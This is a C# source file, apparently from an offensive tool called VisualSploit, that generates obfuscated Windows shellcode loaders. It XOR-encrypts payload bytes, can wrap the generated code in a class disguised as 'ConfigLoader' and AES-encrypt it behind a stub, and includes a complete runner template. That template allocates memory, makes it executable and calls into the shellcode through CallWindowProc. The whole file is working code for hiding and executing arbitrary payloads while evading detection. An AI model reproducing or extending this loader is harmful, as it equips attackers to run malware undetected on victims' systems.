namespace VisualSploit.Obfuscation;

internal record ObfuscatedPayload(
    byte[] EncryptedShellcode,
    byte[][] EncryptionKeys,
    Dictionary<string, string> Variables,
    string DecryptionCode
);

internal static class ObfuscationEngine
{
    public static string Generate(byte[] shellcode, ObfuscationConfig config)
    {
        if (!config.UseObfuscation && !config.UseEncryptedLoader)
        {
            return GenerateLegacyPayload(shellcode);
        }

        var random = config.Seed.HasValue ? new Random(config.Seed.Value) : new Random();
        var nameGen = new NameGenerator(config.Seed);
        var vars = GenerateVariableNames(config);

        byte[] encryptedShellcode;
        byte[][] keys;
        string decryptionCode;

        if (config.HasMethod(ObfuscationMethods.ShellcodeEncryption))
        {
            (encryptedShellcode, keys) = Xor.Encrypt(shellcode, config.XorRounds, config.Seed.HasValue ? random : null);
            decryptionCode = Xor.GenerateDecryptionCode(encryptedShellcode, keys, vars);
        }
        else
        {
            encryptedShellcode = shellcode;
            keys = Array.Empty<byte[]>();
            decryptionCode = string.Empty;
        }

        var payload = new ObfuscatedPayload(
            EncryptedShellcode: encryptedShellcode,
            EncryptionKeys: keys,
            Variables: vars,
            DecryptionCode: decryptionCode
        );

        var code = CodeGenerator.Generate(payload, config, random, nameGen);

        if (config.UseEncryptedLoader)
        {
            var wrappedCode = WrapCode(code);
            var (encrypted, iv) = Aes256.Encrypt(wrappedCode, config.Seed);
            return Stub.Generate(encrypted, iv, config, random);
        }

        return code;
    }

    private static string GenerateLegacyPayload(byte[] shellcode)
    {
        var bytes = string.Join(", ", shellcode.Select(b => $"0x{b:X2}"));
        const string indent = "                  ";

        return $$"""
            {{indent}}[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
            {{indent}}static extern System.IntPtr VirtualAlloc(System.IntPtr addr, uint size, uint allocType, uint protect);

            {{indent}}[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
            {{indent}}static extern bool VirtualProtect(System.IntPtr addr, uint size, uint newProtect, out uint oldProtect);

            {{indent}}[System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
            {{indent}}static extern System.IntPtr CallWindowProc(System.IntPtr lpPrevWndFunc, System.IntPtr hWnd, uint Msg, System.IntPtr wParam, System.IntPtr lParam);

            {{indent}}var shellcode = new byte[] { {{bytes}} };
            {{indent}}var memory = VirtualAlloc(System.IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x04);
            {{indent}}System.Runtime.InteropServices.Marshal.Copy(shellcode, 0, memory, shellcode.Length);
            {{indent}}VirtualProtect(memory, (uint)shellcode.Length, 0x20, out _);
            {{indent}}CallWindowProc(memory, System.IntPtr.Zero, 0, System.IntPtr.Zero, System.IntPtr.Zero);
            """;
    }

    private static string WrapCode(string code)
    {
        return $"public static class ConfigLoader {{ public static void Load() {{ {code} }} }}";
    }

    private static Dictionary<string, string> GenerateVariableNames(ObfuscationConfig config)
    {
        var vars = new Dictionary<string, string>
        {
            ["encrypted"] = "encrypted",
            ["shellcode"] = "shellcode",
            ["memory"] = "memory",
            ["allocSize"] = "allocSize",
            ["i"] = "i",
            ["VirtualAlloc"] = "VirtualAlloc",
            ["VirtualProtect"] = "VirtualProtect",
            ["CallWindowProc"] = "CallWindowProc"
        };

        var rounds = config.HasMethod(ObfuscationMethods.ShellcodeEncryption) ? config.XorRounds : 0;
        for (int i = 0; i < rounds; i++)
            vars[$"key{i}"] = $"key{i}";

        return vars;
    }
}
